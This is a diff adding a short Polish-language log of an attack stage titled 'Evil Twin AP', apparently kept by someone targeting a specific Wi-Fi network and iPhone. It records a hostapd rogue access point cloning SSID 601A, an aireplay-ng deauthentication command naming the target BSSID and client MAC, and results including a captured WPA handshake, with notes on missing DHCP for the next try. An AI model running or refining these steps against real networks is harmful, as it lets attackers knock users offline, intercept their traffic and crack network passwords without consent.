@@ -1,0 +1,10 @@
+# ETAP 3 — Evil Twin AP (pierwsza proba)
+## Komenda
+hostapd z konfiguracja SSID=601A, WPA2-PSK na wlan0 (kanal 4).
+aireplay-ng --deauth 50 -a 7C:F1:7E:C1:7B:95 -c BA:A1:0E:08:E0:35 wlan1
+## Wynik
+Evil Twin AP postawiony: BSSID 64:70:02:18:B9:22, RSSI -20 dBm (silniejszy niz oryginal -40 dBm).
+iPhone NIE przelaczyl sie - auto-join zablokowane po wielokrotnych deauth.
+WPA handshake przechwycony dla oryginalnego AP.
+## Notatki
+Problem: hostapd nie mial DHCP (dnsmasq). iPhone widzi siec ale nie moze uzyskac adresu IP.
